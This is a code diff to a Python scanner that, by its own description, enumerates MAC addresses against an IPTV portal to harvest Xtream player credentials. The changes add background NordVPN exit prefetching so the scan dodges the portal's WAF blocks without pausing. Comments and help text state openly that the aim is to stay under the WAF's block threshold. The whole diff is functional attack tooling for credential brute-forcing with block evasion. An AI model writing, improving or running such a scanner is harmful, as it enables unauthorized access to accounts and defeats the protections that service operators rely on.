@@ -11,7 +11,10 @@ create_link flow, the underlying Xtream player credentials.
 
 It rotates the source IP through the `nordvpn` CLI both proactively (after N
 requests per IP) and reactively (when a block is detected), so a large scan can
-run continuously without a hard WAF block.
+run continuously without a hard WAF block. Rotation is prefetched in the
+background: while the current IP still has its last probes in flight the next
+NordVPN exit is already being dialed, so the scan never stops for the full
+reconnect.
 
 This is a parallel, thread-based scanner: multiple worker threads pull MACs
 from a shared queue and probe the portal concurrently, while a single serialized
@@ -300,12 +303,20 @@ class Rotator:
     Serializes all rotations behind a single lock (only one disconnect/connect
     at a time). Keeps a round-robin index over the available countries so
     successive rotations use different exit points, and tracks a per-IP request
-    counter for proactive rotation.
+    counter for proactive rotation. Rotations may run on a background thread
+    (prefetch) so the barrier stall is hidden behind ongoing probes.
     """
 
-    def __init__(self, country=None, requests_per_ip=None):
+    def __init__(self, country=None, requests_per_ip=None, prefetch=True):
         self.country = country
         self.requests_per_ip = requests_per_ip
+        # When True, rotation runs on a background thread and is *prefetched*:
+        # it starts while the current IP still has its last request or two in
+        # flight, so by the time the budget runs out the fresh IP is usually
+        # already in place and the barrier stall is ~0 instead of the full
+        # nordvpn reconnect time. When False, the claiming worker rotates
+        # inline on budget exhaustion (the old, stall-everything behaviour).
+        self.prefetch = prefetch
         self.countries = []
         if country:
             self.countries = [country]
@@ -330,6 +341,7 @@ class Rotator:
         # keep-alive connections keep routing out through the burned IP and the
         # rotation has no effect.
         self._generation = 0
+        self._rot_thread = None
 
     def generation(self):
         return self._generation
@@ -351,6 +363,30 @@ class Rotator:
             self._idx += 1
         return c
 
+    def _spawn_rotate(self):
+        """Start a rotation on a background thread. Caller holds self._cv."""
+        self._rot_thread = threading.Thread(
+            target=self._rotate, name="rotator", daemon=True)
+        self._rot_thread.start()
+
+    def _maybe_prefetch(self):
+        """Kick off a background rotation while the current IP still has
+        budget left, hiding the reconnect latency behind the scan itself.
+
+        The rotation is triggered once the budget is down to its last request
+        or two, so at most that many probes still ride the old IP (they may
+        fail and get re-probed on the fresh one, which costs far less than a
+        full stop-the-world stall per rotation). Only one rotation is ever
+        spawned per generation (the _dirty claim). Caller holds self._cv.
+        """
+        if self._dirty or not self.prefetch or self.requests_per_ip is None:
+            return
+        if self._used_this_ip >= self.requests_per_ip - 1:
+            self._dirty = True
+            log.debug("prefetch-rotating: %d/%d requests used",
+                      self._used_this_ip, self.requests_per_ip)
+            self._spawn_rotate()
+
     def _rotate(self):
         """Perform one blocking rotation.
 
@@ -358,17 +394,27 @@ class Rotator:
         (two threads never issue competing disconnects) while the shared state
         lock is only held for the short bookkeeping updates — never across the
         blocking call — so the other workers keep making progress.
+
+        Must always finish by bumping the generation, even on error: workers
+        may be parked on the barrier waiting for that bump, and a dead
+        rotation thread would stall the whole scan forever.
         """
         with self._rotate_lock:
-            prev_ip = self.current
-            country = self._next_country()
-            new_ip = rotate_nordvpn(country, avoid_ip=prev_ip)
-            # If we landed on the same IP anyway (server reuse, or the tunnel
-            # didn't change route), try one more country before accepting it.
-            if new_ip and new_ip == prev_ip:
-                country2 = self._next_country()
-                log.info("same IP as before (%s); trying %s", new_ip, country2)
-                new_ip = rotate_nordvpn(country2, avoid_ip=prev_ip)
+            try:
+                prev_ip = self.current
+                country = self._next_country()
+                new_ip = rotate_nordvpn(country, avoid_ip=prev_ip)
+                # If we landed on the same IP anyway (server reuse, or the
+                # tunnel didn't change route), try one more country before
+                # accepting it.
+                if new_ip and new_ip == prev_ip:
+                    country2 = self._next_country()
+                    log.info("same IP as before (%s); trying %s",
+                             new_ip, country2)
+                    new_ip = rotate_nordvpn(country2, avoid_ip=prev_ip)
+            except Exception as e:  # noqa: BLE001
+                log.warning("rotation error: %s", e)
+                new_ip = None
             with self._cv:
                 self.current = new_ip or "<unknown>"
                 self._used_this_ip = 0
@@ -400,17 +446,31 @@ class Rotator:
         pounding the burning IP, so most of the scan was spent on blocked
         retries instead of fresh probes).
 
-        Only one worker actually performs the blocking rotation; the rest
-        sleep on the condition and are woken the instant that rotation bumps
-        the generation -- no busy-polling.
+        With prefetch enabled the rotation runs on a background thread and is
+        started *before* the budget is exhausted (see _maybe_prefetch), so by
+        the time workers park here the fresh IP is usually already in place
+        and the stall is ~0. Workers park on the condition and are woken the
+        instant a rotation bumps the generation -- no busy-polling. With
+        prefetch disabled, the claiming worker performs the blocking rotation
+        itself and the rest park until it lands.
         """
         while True:
             with self._cv:
                 if self.requests_per_ip is None \
                         or self._used_this_ip < self.requests_per_ip:
                     self._used_this_ip += 1
+                    self._maybe_prefetch()
                     return
-                # Budget exhausted on this generation -> rotation required.
+                if self.prefetch:
+                    # Budget exhausted: make sure a rotation is in flight
+                    # (the prefetch usually got there first), then park until
+                    # the generation advances (which resets the budget).
+                    self._maybe_prefetch()
+                    gen = self._generation
+                    self._cv.wait_for(lambda: self._generation != gen)
+                    continue
+                # Legacy path: the claiming worker performs the blocking
+                # rotation itself.
                 claimed = not self._dirty
                 if claimed:
                     self._dirty = True
@@ -422,8 +482,7 @@ class Rotator:
                     gen = self._generation
                     self._cv.wait_for(lambda: self._generation != gen)
                     continue
-            # The claiming worker performs the blocking rotation OUTSIDE the
-            # lock, then loops back to take a slot on the fresh IP.
+            # OUTSIDE the lock, then loop back to take a slot on the fresh IP.
             self._rotate()
 
     def report_blocked(self, gen_at_start=None):
@@ -877,6 +936,9 @@ def parse_args(argv):
                     help="rotate to a fresh IP after N requests per IP "
                          "(default %(default)s; the WAF hard-burns an IP after "
                          "~7 rapid requests, so stay below it)")
+    ap.add_argument("--no-prefetch", action="store_true",
+                    help="disable background prefetch rotation: rotate inline "
+                         "(stalling all workers) when the budget is exhausted")
     ap.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                     help="sleep between MACs (default %(default)s s)")
     ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
@@ -922,7 +984,8 @@ def main(argv=None):
         else:
             args.max_found = args.count
 
-    rotator = Rotator(country=args.country, requests_per_ip=args.requests_per_ip)
+    rotator = Rotator(country=args.country, requests_per_ip=args.requests_per_ip,
+                      prefetch=not args.no_prefetch)
     portal = Portal(args.base, timeout=args.timeout, rotator=rotator)
     state = State(args.state)
 
